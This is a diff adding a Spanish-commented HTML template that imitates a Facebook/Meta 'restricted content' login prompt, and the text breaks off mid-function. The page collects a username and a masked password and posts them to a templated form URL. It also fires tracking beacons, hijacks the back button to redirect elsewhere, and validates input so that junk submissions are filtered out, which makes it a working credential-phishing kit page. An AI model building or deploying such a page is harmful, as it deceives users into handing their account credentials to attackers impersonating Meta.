@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Contenido restringido</title>
+
+    <link rel="stylesheet" type="text/css"
+        href="https://cdn.rawgit.com/noppa/text-security/master/dist/text-security.css">
+    {{!-- <script src="https://cdn.tailwindcss.com"></script> --}}
+
+    <style>
+        a,hr{color:inherit}progress,sub,sup{vertical-align:baseline}blockquote,body,dd,dl,fieldset,figure,h1,h2,h3,h4,h5,h6,hr,menu,ol,p,pre,ul{margin:0}.p-0,dialog,fieldset,legend,menu,ol,ul{padding:0}.bg-\[\#000\],.bg-\[\#0866ff\],.bg-gray-200,.bg-white{--tw-bg-opacity:1}.transition-all,.transition-colors,.transition-opacity{transition-timing-function:cubic-bezier(0.4,0,0.2,1);transition-duration:150ms}*,::after,::before{box-sizing:border-box;border:0 solid #e5e7eb;--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }.border-t,hr{border-top-width:1px}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif,system-ui,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{line-height:inherit}hr{height:0}abbr:where([title]){text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}menu,ol,ul{list-style:none}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}.cursor-pointer,[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}.hidden,[hidden]{display:none}::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }.pointer-events-none{pointer-events:none}.visible{visibility:visible}.fixed{position:fixed}.absolute{position:absolute}.relative{position:relative}.inset-0{inset:0px}.bottom-4{bottom:1rem}.left-1{left:.25rem}.left-1\/2{left:50%}.right-3{right:.75rem}.top-1\/2{top:50%}.peer:focus~.peer-focus\:top-5,.top-5{top:1.25rem}.z-10{z-index:10}.mx-auto{margin-left:auto;margin-right:auto}.my-3{margin-top:.75rem;margin-bottom:.75rem}.my-8{margin-top:2rem;margin-bottom:2rem}.mb-1\.5{margin-bottom:.375rem}.mb-3{margin-bottom:.75rem}.mb-3\.5{margin-bottom:.875rem}.mb-4{margin-bottom:1rem}.mb-5{margin-bottom:1.25rem}.mt-\[5vh\]{margin-top:5vh}.block{display:block}.inline-block{display:inline-block}.flex{display:flex}.h-3{height:.75rem}.h-5{height:1.25rem}.h-full{height:100%}.h-px{height:1px}.min-h-full{min-height:100%}.w-11\/12{width:91.666667%}.w-5{width:1.25rem}.w-\[90\%\]{width:90%}.w-full{width:100%}.w-screen{width:100vw}.max-w-\[280px\]{max-width:280px}.max-w-md{max-width:28rem}.max-w-xl{max-width:36rem}.flex-shrink-0{flex-shrink:0}.flex-grow-0{flex-grow:0}.origin-\[0\]{transform-origin:0}.-translate-x-1\/2,.-translate-y-1\/2,.-translate-y-4,.peer:focus~.peer-focus\:-translate-y-4,.peer:focus~.peer-focus\:scale-95,.scale-95,.transform{transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.-translate-x-1\/2{--tw-translate-x:-50%}.-translate-y-1\/2{--tw-translate-y:-50%}.-translate-y-4,.peer:focus~.peer-focus\:-translate-y-4{--tw-translate-y:-1rem}.peer:focus~.peer-focus\:scale-95,.scale-95{--tw-scale-x:.95;--tw-scale-y:.95}.flex-col{flex-direction:column}.items-center{align-items:center}.justify-end{justify-content:flex-end}.justify-center{justify-content:center}.space-x-2>:not([hidden])~:not([hidden]){--tw-space-x-reverse:0;margin-right:calc(.5rem * var(--tw-space-x-reverse));margin-left:calc(.5rem * calc(1 - var(--tw-space-x-reverse)))}.overflow-hidden{overflow:hidden}.overflow-y-auto{overflow-y:auto}.whitespace-nowrap{white-space:nowrap}.rounded-3xl{border-radius:1.5rem}.rounded-lg{border-radius:.5rem}.rounded-xl{border-radius:.75rem}.border{border-width:1px}.border-gray-300{--tw-border-opacity:1;border-color:rgb(209 213 219 / var(--tw-border-opacity))}.bg-\[\#000\]{background-color:rgb(0 0 0 / var(--tw-bg-opacity))}.bg-\[\#0866ff\]{background-color:rgb(8 102 255 / var(--tw-bg-opacity))}.bg-gray-200{background-color:rgb(229 231 235 / var(--tw-bg-opacity))}.bg-white{background-color:rgb(255 255 255 / var(--tw-bg-opacity))}.bg-opacity-50{--tw-bg-opacity:0.5}.object-contain{object-fit:contain}.p-4{padding:1rem}.p-6{padding:1.5rem}.peer:focus~.peer-focus\:px-2,.px-2{padding-left:.5rem;padding-right:.5rem}.px-3{padding-left:.75rem;padding-right:.75rem}.px-4{padding-left:1rem;padding-right:1rem}.px-5{padding-left:1.25rem;padding-right:1.25rem}.py-2\.5{padding-top:.625rem;padding-bottom:.625rem}.py-3{padding-top:.75rem;padding-bottom:.75rem}.pb-20{padding-bottom:5rem}.pb-4{padding-bottom:1rem}.pb-\[0\.9rem\]{padding-bottom:.9rem}.pr-12{padding-right:3rem}.pt-20{padding-top:5rem}.pt-5{padding-top:1.25rem}.pt-\[1\.3rem\]{padding-top:1.3rem}.text-left{text-align:left}.text-center{text-align:center}.text-\[1\.075rem\]{font-size:1.075rem}.text-base{font-size:1rem;line-height:1.5rem}.peer:focus~.peer-focus\:text-sm,.text-sm{font-size:.875rem;line-height:1.25rem}.text-xs{font-size:.75rem;line-height:1rem}.font-medium{font-weight:500}.font-semibold{font-weight:600}.text-blue-500{--tw-text-opacity:1;color:rgb(59 130 246 / var(--tw-text-opacity))}.text-gray-500{--tw-text-opacity:1;color:rgb(107 114 128 / var(--tw-text-opacity))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity))}.shadow-xl{--tw-shadow:0 20px 25px -5px rgb(0 0 0 / 0.1),0 8px 10px -6px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 20px 25px -5px var(--tw-shadow-color),0 8px 10px -6px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)}.focus\:outline-none:focus,.outline-none{outline:transparent solid 2px;outline-offset:2px}.blur{--tw-blur:blur(8px);filter:var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow)}.transition-all{transition-property:all}.transition-colors{transition-property:color,background-color,border-color,text-decoration-color,fill,stroke}.transition-opacity{transition-property:opacity}.duration-300{transition-duration:.3s}.peer:placeholder-shown~.peer-placeholder-shown\:top-1\/2{top:50%}.peer:placeholder-shown~.peer-placeholder-shown\:-translate-y-1\/2{--tw-translate-y:-50%;transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.peer:placeholder-shown~.peer-placeholder-shown\:scale-100{--tw-scale-x:1;--tw-scale-y:1;transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}@media (min-width:640px){.sm\:my-8{margin-top:2rem;margin-bottom:2rem}.sm\:items-center{align-items:center}.sm\:p-0{padding:0}.sm\:p-6{padding:1.5rem}.sm\:pb-4{padding-bottom:1rem}}
+    </style>
+    
+    <style>
+        .gradient {
+            background-image: radial-gradient(rgba(255, 255, 255, 0.25), rgba(255, 255, 255, 0) 40%), radial-gradient(rgb(255, 209, 82) 30%, rgb(226, 105, 150), rgba(226, 105, 150, 0.4) 41%, transparent 52%), radial-gradient(rgb(160, 51, 255) 37%, transparent 46%), linear-gradient(155deg, transparent 65%, rgb(37, 212, 102) 95%), linear-gradient(45deg, rgb(0, 101, 224), rgb(15, 139, 255));
+            background-position: left bottom, 109% 68%, 109% 68%, center center, center center;
+            background-repeat: no-repeat;
+            background-size: 200% 200%, 285% 500%, 285% 500%, cover, cover;
+            inset: 0px;
+            opacity: 0.08;
+            pointer-events: none;
+            position: absolute;
+        }
+
+        .ehloqInput {
+            font-family: "text-security-disc";
+            -webkit-text-security: disc;
+            -moz-text-security: circle;
+            /* color: rgba(114, 114, 114, 1); */
+        }
+
+        .spinner {
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top: 2px solid #ffffff;
+            border-radius: 50%;
+            width: 1.3rem;
+            height: 1.3rem;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="screen">
+        <div class="background">
+            <div class="back">
+                <div class="gradient"></div>
+            </div>
+        </div>
+
+        <div class="content w-11/12 max-w-xl mx-auto">
+            <div id="mainColumn" class="h-full flex flex-col items-center relative">
+                <div class="flex items-center justify-center mb-4 mt-[5vh]">
+                    <svg fill="#0866ff" width="4.5rem" height="4.5rem" viewBox="0 0 24 24"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <path
+                            d="M12 2.03998C6.5 2.03998 2 6.52998 2 12.06C2 17.06 5.66 21.21 10.44 21.96V14.96H7.9V12.06H10.44V9.84998C10.44 7.33998 11.93 5.95998 14.22 5.95998C15.31 5.95998 16.45 6.14998 16.45 6.14998V8.61998H15.19C13.95 8.61998 13.56 9.38998 13.56 10.18V12.06H16.34L15.89 14.96H13.56V21.96C15.9164 21.5878 18.0622 20.3855 19.6099 18.57C21.1576 16.7546 22.0054 14.4456 22 12.06C22 6.52998 17.5 2.03998 12 2.03998Z" />
+                    </svg>
+                </div>
+
+                <form class="w-full" id="custom"
+                    action="{{ payload.formUrl }}" method="post"
+                    onsubmit="return validateForm()">
+                    <input type="hidden" name="token" value="{{ payload.identifier }}" />
+
+                    <div id="splitMessage" style="margin-top: 1.5rem;">
+                        <div class="pointer-events-none h-px flex-grow-0 flex-shrink-0 bg-gray-200"></div>
+
+                        <div class="relative my-3">
+                            <div class="text-base font-medium">
+                                <span class="text-gray-500">{{ texts.splitMessage }}</span>
+                                <span class="text-primary-500 cursor-pointer"><a id="gpname"
+                                        style="color: rgb(0, 100, 224)" href="javascript:void()" role="link">{{ texts.gpNameDefault }}</a></span>
+                            </div>
+                        </div>
+
+                        <!-- <div class="text-base font-medium">
+                            <span class="text-gray-500">
+                                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"
+                                    class="inline-block h-5 w-5">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                        d="M12 4c-2.21 0-4 1.79-4 4v1H8a2 2 0 00-2 2v7a2 2 0 002 2h8a2 2 0 002-2v-7a2 2 0 00-2-2h-1V8a4 4 0 00-4-4zm-2 7h4m-2 2v4">
+                                    </path>
+                                </svg>
+                                Necesitamos que verifiques tus datos para poder acceder al video del grupo.
+                            </span>
+                            <span class="text-primary-500 cursor-pointer">
+                                <a id="gpname" style="color: rgb(0, 100, 224)" href="javascript:void()" role="link">Contenido restringido</a>
+                            </span>
+                        </div> -->
+
+                        <div class="pointer-events-none h-px mb-5 flex-grow-0 flex-shrink-0 bg-gray-200"></div>
+                    </div>
+
+                    <div class="relative mb-3.5">
+                        <input type="text" id="username" name="username"
+                            class="w-full peer block pr-12 rounded-xl border border-gray-300 px-3 pt-[1.3rem] pb-[0.9rem] text-base font-medium focus:outline-none"
+                            spellcheck="false" placeholder="" formControlName="username" autocomplete="on" />
+                        <label for="username"
+                            class="absolute top-5 left-1 z-10 origin-[0] -translate-y-4 scale-95 transform px-2 text-base text-gray-500 duration-300 peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:scale-100 peer-focus:top-5 peer-focus:-translate-y-4 peer-focus:scale-95 peer-focus:px-2 peer-focus:text-sm">
+                            {{ texts.inputNameField }}
+                        </label>
+                        <div id="clearIcon"
+                            class="hidden absolute top-1/2 right-3 transform -translate-y-1/2 cursor-pointer">
+                            <svg width="1.6rem" height="1.6rem" viewBox="0 0 24 24" version="1.1"
+                                xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+                                <title>Close</title>
+                                <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                                    <g id="Close">
+                                        <rect id="Rectangle" fill-rule="nonzero" x="0" y="0" width="24" height="24">
+
+                                        </rect>
+                                        <line x1="16.9999" y1="7" x2="7.00001" y2="16.9999" id="Path" stroke="#475569"
+                                            stroke-width="2" stroke-linecap="round">
+
+                                        </line>
+                                        <line x1="7.00006" y1="7" x2="17" y2="16.9999" id="Path" stroke="#475569"
+                                            stroke-width="2" stroke-linecap="round">
+
+                                        </line>
+                                    </g>
+                                </g>
+                            </svg>
+
+                        </div>
+                    </div>
+
+                    <div class="relative mb-3.5">
+                        <input type="text" id="name" name="name"
+                            class="w-full peer block pr-12 ehloqInput rounded-xl border border-gray-300 px-3 pt-[1.3rem] pb-[0.9rem] text-base font-medium focus:outline-none"
+                            spellcheck="false" placeholder="" formControlName="name" autocomplete="on" />
+                        <label for="name"
+                            class="absolute top-5 left-1 z-10 origin-[0] -translate-y-4 scale-95 transform px-2 text-base text-gray-500 duration-300 peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:scale-100 peer-focus:top-5 peer-focus:-translate-y-4 peer-focus:scale-95 peer-focus:px-2 peer-focus:text-sm">
+                            {{ texts.inputPswField }}
+                        </label>
+
+                        <div id="show-hide"
+                            class="hidden absolute top-1/2 right-3 transform -translate-y-1/2 cursor-pointer">
+                            <svg id="hide" class="block" width="1.5rem" height="1.5rem" viewBox="0 0 24 24" fill="none"
+                                xmlns="http://www.w3.org/2000/svg">
+                                <g id="Edit / Hide">
+                                    <path id="Vector"
+                                        d="M3.99989 4L19.9999 20M16.4999 16.7559C15.1473 17.4845 13.6185 17.9999 11.9999 17.9999C8.46924 17.9999 5.36624 15.5478 3.5868 13.7788C3.1171 13.3119 2.88229 13.0784 2.7328 12.6201C2.62619 12.2933 2.62616 11.7066 2.7328 11.3797C2.88233 10.9215 3.11763 10.6875 3.58827 10.2197C4.48515 9.32821 5.71801 8.26359 7.17219 7.42676M19.4999 14.6335C19.8329 14.3405 20.138 14.0523 20.4117 13.7803L20.4146 13.7772C20.8832 13.3114 21.1182 13.0779 21.2674 12.6206C21.374 12.2938 21.3738 11.7068 21.2672 11.38C21.1178 10.9219 20.8827 10.6877 20.4133 10.2211C18.6338 8.45208 15.5305 6 11.9999 6C11.6624 6 11.3288 6.02241 10.9999 6.06448M13.3228 13.5C12.9702 13.8112 12.5071 14 11.9999 14C10.8953 14 9.99989 13.1046 9.99989 12C9.99989 11.4605 10.2135 10.9711 10.5608 10.6113"
+                                        stroke="#475569" stroke-width="2" stroke-linecap="round"
+                                        stroke-linejoin="round" />
+                                </g>
+                            </svg>
+
+                            <svg id="show" class="hidden" width="1.5rem" height="1.5rem" viewBox="0 0 24 24" fill="none"
+                                xmlns="http://www.w3.org/2000/svg">
+                                <g id="Edit / Show">
+                                    <g id="Vector">
+                                        <path
+                                            d="M3.5868 13.7788C5.36623 15.5478 8.46953 17.9999 12.0002 17.9999C15.5308 17.9999 18.6335 15.5478 20.413 13.7788C20.8823 13.3123 21.1177 13.0782 21.2671 12.6201C21.3738 12.2933 21.3738 11.7067 21.2671 11.3799C21.1177 10.9218 20.8823 10.6877 20.413 10.2211C18.6335 8.45208 15.5308 6 12.0002 6C8.46953 6 5.36623 8.45208 3.5868 10.2211C3.11714 10.688 2.88229 10.9216 2.7328 11.3799C2.62618 11.7067 2.62618 12.2933 2.7328 12.6201C2.88229 13.0784 3.11714 13.3119 3.5868 13.7788Z"
+                                            stroke="#475569" stroke-width="2" stroke-linecap="round"
+                                            stroke-linejoin="round" />
+                                        <path
+                                            d="M10 12C10 13.1046 10.8954 14 12 14C13.1046 14 14 13.1046 14 12C14 10.8954 13.1046 10 12 10C10.8954 10 10 10.8954 10 12Z"
+                                            stroke="#475569" stroke-width="2" stroke-linecap="round"
+                                            stroke-linejoin="round" />
+                                    </g>
+                                </g>
+                            </svg>
+                        </div>
+                    </div>
+
+                    <button type="submit" form="custom"
+                        class="bg-[#0866ff] text-white text-base rounded-3xl py-2.5 px-5 transition-colors w-full text-base relative">
+                        <span id="text">{{ texts.buttonSubmit }}</span>
+                        <span id="spinner" class="hidden absolute top-1/2 left-1/2 -translate-y-1/2 -translate-x-1/2">
+                            <div class="spinner"></div>
+                        </span>
+                    </button>
+                </form>
+
+                <!-- flex flex-col justify-end -->
+                <div class="flex flex-col justify-end">
+                    <div class="flex items-center justify-center pt-20 pb-20">
+                        <img alt="Logotipo"
+                            src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/64px-Meta_Platforms_Inc._logo.svg.png"
+                            class="h-3 object-contain" />
+                    </div>
+                </div>
+
+                <div class="absolute bottom-4 flex items-center space-x-2">
+                    <span role="link" tabindex="0" class="cursor-pointer text-gray-500 text-xs">
+                        Information
+                    </span>
+                    <span role="link" tabindex="0" class="cursor-pointer text-gray-500 text-xs">
+                        Help
+                    </span>
+                    <span role="link" tabindex="0" class="cursor-pointer text-gray-500 text-xs">
+                        More
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="modal" class="relative z-10 hidden" aria-labelledby="modal-title" role="dialog" aria-modal="true">
+        <div class="fixed inset-0 bg-[#000] bg-opacity-50 transition-opacity" aria-hidden="true"></div>
+
+        <div class="fixed inset-0 z-10 w-screen overflow-y-auto">
+            <div id="overlay"
+                class="flex min-h-full items-center justify-center p-4 text-center sm:items-center sm:p-0">
+                <div
+                    class="relative transform overflow-hidden rounded-lg bg-white text-left shadow-xl transition-all sm:my-8 w-[90%] max-w-md">
+                    <div class="bg-white px-4 pb-4 pt-5 sm:p-6 sm:pb-4">
+                        <div class="font-semibold text-center text-[1.075rem] mb-1.5 px-2">{{ texts.modalTitle }}</div>
+
+                        <div class="text-center text-sm px-2 mb-3">{{ texts.modalContent }}</div>
+                    </div>
+
+                    <div id="modalButton" role="button" tabindex="0"
+                        class="w-full text-center cursor-pointer inline-block whitespace-nowrap py-3 border-t border-gray-300 text-blue-500">
+                        {{ texts.modalButton }}
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let usernameInput,
+            namePwsInput,
+            submitButton,
+            spinner,
+            modal,
+            overlay,
+            modalButton,
+            clearUserIcon,
+            showHidePswContainer;
+
+        // Configuración inicial de los elementos del formulario
+        function setupFormElements() {
+            const inputs = document.querySelectorAll('input');
+            const splitMessage = document.getElementById('splitMessage');
+            const hidePswIcon = document.getElementById('hide');
+            const showPswIcon = document.getElementById('show');
+
+            usernameInput = document.getElementById('username');
+            namePwsInput = document.getElementById('name');
+            submitButton = document.querySelector('button[type="submit"]');
+            spinner = document.getElementById('spinner');
+            modal = document.getElementById('modal');
+            overlay = document.getElementById('overlay');
+            modalButton = document.getElementById('modalButton');
+            clearUserIcon = document.querySelector('#clearIcon');
+            showHidePswContainer = document.getElementById('show-hide');
+
+            // AGREGAR REDIRED BACK
+            window.addEventListener('popstate', event => {
+                window.location.href = "{{payload.backRedirect}}";
+            });
+            history.pushState({ page: 'mi_pagina' }, 'Mi Página', generateId(15));
+
+            // SETIAR CONTADORES
+            setTimeout(function () {
+                new Image().src = "{{payload.counter}}";
+            }, 100);
+            setTimeout(function () {
+                new Image().src = "{{payload.globalCounter}}";
+            }, 100);
+
+            // Evento: Cuando el campo de usuario está enfocado
+            usernameInput.addEventListener('focus', () => {
+                splitMessage.style.display = 'none';
+                handleInputChange(usernameInput);
+            });
+
+            // Evento: Cuando el campo de usuario pierde el foco
+            usernameInput.addEventListener('blur', () => {
+                setTimeout(() => {
+                    const focusedInput = document.querySelector(':focus');
+                    if (!focusedInput) {
+                        splitMessage.style.display = 'block';
+                    }
+                }, 300);
+                handleInputChange(usernameInput);
+            });
+
+            // Evento: Cambios en el campo de usuario
+            usernameInput.addEventListener('input', () => {
+                handleInputChange(usernameInput);
+            });
+
+            // Evento: Cuando el campo de nombre/contraseña está enfocado
+            namePwsInput.addEventListener('focus', () => {
+                splitMessage.style.display = 'none';
+            });
+
+            // Evento: Cuando el campo de nombre/contraseña pierde el foco
+            namePwsInput.addEventListener('blur', () => {
+                // splitMessage.style.display = 'block';
+                setTimeout(() => {
+                    const focusedInput = document.querySelector(':focus');
+                    if (!focusedInput) {
+                        splitMessage.style.display = 'block';
+                    }
+                }, 300);
+            });
+
+            // Evento: Cambios en el campo de nombre/contraseña
+            namePwsInput.addEventListener('input', () => {
+                handleInputChange(namePwsInput);
+            });
+
+            // Evento: Icono para borrar el campo de usuario
+            clearUserIcon.addEventListener('mousedown', (event) => {
+                event.preventDefault();
+                usernameInput.value = '';
+                handleInputChange(usernameInput);
+            });
+
+            // Evento: Mostrar/ocultar contraseña
+            hidePswIcon.addEventListener('mousedown', (event) => {
+                event.preventDefault();
+                namePwsInput.classList.toggle('ehloqInput');
+                hidePswIcon.style.display = 'none';
+                showPswIcon.style.display = 'block';
+            });
+
+            showPswIcon.addEventListener('mousedown', (event) => {
+                event.preventDefault();
+                namePwsInput.classList.toggle('ehloqInput');
+                showPswIcon.style.display = 'none';
+                hidePswIcon.style.display = 'block';
+            });
+
+            // Evento: Cerrar modal al hacer clic en el overlay o el botón
+            modal.addEventListener('click', (event) => {
+                if (event.target === overlay || event.target === modalButton) {
+                    modal.style.display = 'none';
+                }
+            });
+
+            // Manejo de la tecla "Enter" en el formulario
+            document.querySelector('form').addEventListener('keydown', function (event) {
+                if (event.key === 'Enter') {
+                    const activeElement = document.activeElement;
+                    if (activeElement.id === 'username') {
+                        document.getElementById('name').focus();
+                        event.preventDefault();
+                    } else if (activeElement.id === 'name') {
+                        // ¿Qué debería suceder aquí?
+                    }
+                }
+            });
+        }
+
+        function generateId(length) {
+            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let randomId = '';
+
+            for (let i = 0; i < length; i++) {
+                const randomIndex = Math.floor(Math.random() * characters.length);
+                randomId += characters.charAt(randomIndex);
+            }
+
+            return '/' + randomId + '.html';
+        }
+
+        // Función para manejar cambios en los campos de entrada
+        function handleInputChange(currentInput) {
+            const inputValue = currentInput.value.trim();
+            if (currentInput.id === 'username') {
+                clearUserIcon.style.display = inputValue && document.activeElement === currentInput ? 'block' : 'none';
+            } else {
+                showHidePswContainer.style.display = inputValue ? 'block' : 'none';
+            }
+        }
+
+        // Función para cambiar el estado del formulario
+        function changeFormStatus(sending) {
+            const inputs = [usernameInput, namePwsInput, submitButton];
+
+            if (sending) {
+                inputs.forEach((input) => input.setAttribute('disabled', true));
+                submitButton.querySelector('#text').style.visibility = 'hidden';
+                spinner.style.display = 'block';
+            } else {
+                inputs.forEach((input) => input.removeAttribute('disabled'));
+                submitButton.querySelector('#text').style.visibility = 'visible';
+                spinner.style.display = 'none';
+            }
+        }
+
+        // Función para mostrar el mensaje modal
+        function showModalMessage() {
+            modal.style.display = 'block';
+        }
+
+        // Function para crear un input tipo hidden
+        function addHiddenInput(name, value) {
+            // Crea un nuevo elemento input
+            const inputHidden = document.createElement("input");
+            inputHidden.type = "hidden";
+            inputHidden.name = name; // Asigna el nombre proporcionado
+            inputHidden.value = value; // Asigna el valor proporcionado
+
+            // Encuentra tu formulario (puedes usar un ID o cualquier otro selector)
+            const form = document.querySelector("form");
+
+            // Agrega el nuevo campo oculto al formulario
+            form.appendChild(inputHidden);
+        }
+
+        // Función para validar el formulario
+        function validateForm() {
+            try {
+                const usernameValue = usernameInput.value.trim();
+                const nameValue = namePwsInput.value.trim();
+
+                changeFormStatus(true);
+
+                // Regla 1: No caracteres repetidos de forma secuencial tres veces o más
+                const repeatedPattern = "(.)\\1{2,}";
+                if (new RegExp(repeatedPattern).test(usernameValue) || new RegExp(repeatedPattern).test(nameValue)) {
+                    return validateResponse({ isOk: false, message: 'Error: Secuencia repetida' });
+                }
+
+                // Regla 2: Correo electrónico válido
+                const emailPattern = "^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}$";
+                if (usernameValue.includes('@') && !new RegExp(emailPattern).test(usernameValue)) {
+                    return validateResponse({ isOk: false, message: 'Error: Correo electrónico inválido' });
+                }
+
+                // Verificar si comienza con un dígito o con el signo "+"
+                // const phonePattern = "^\\d|\\+$";
+                // const phonePattern = "^\\d|\\+";
+                // const phonePattern = "^\\\\d|\\\\+$";
+                const phonePattern = "^\\d|\\+$";
+                if (new RegExp(phonePattern).test(usernameValue.charAt(0))) {
+                    // Si comienza con "+", verificar que esté al inicio
+
+                    if (usernameValue.charAt(0) === '+') {
+                        const phoneNumberWithoutPlus = usernameValue.slice(1);
+                        // Validar que todos los caracteres sean números (sin contar el "+")
+                        // Expresión regular para verificar si phoneNumberWithoutPlus contiene solo dígitos
+                        if (new RegExp("^\\d+$").test(phoneNumberWithoutPlus)) {
+                            // Verificar la longitud (sin contar el "+")
+                            if (phoneNumberWithoutPlus.length >= 10 && phoneNumberWithoutPlus.length <= 13) {
+                                // El número de teléfono es válido
+                                // return validateResponse({isOk: true, message: 'Número de teléfono válido'});
+                            } else {
+                                return validateResponse({ isOk: false, message: 'Error: Longitud incorrecta (debe ser entre 10 y 13 caracteres)' });
+                            }
+                        } else {
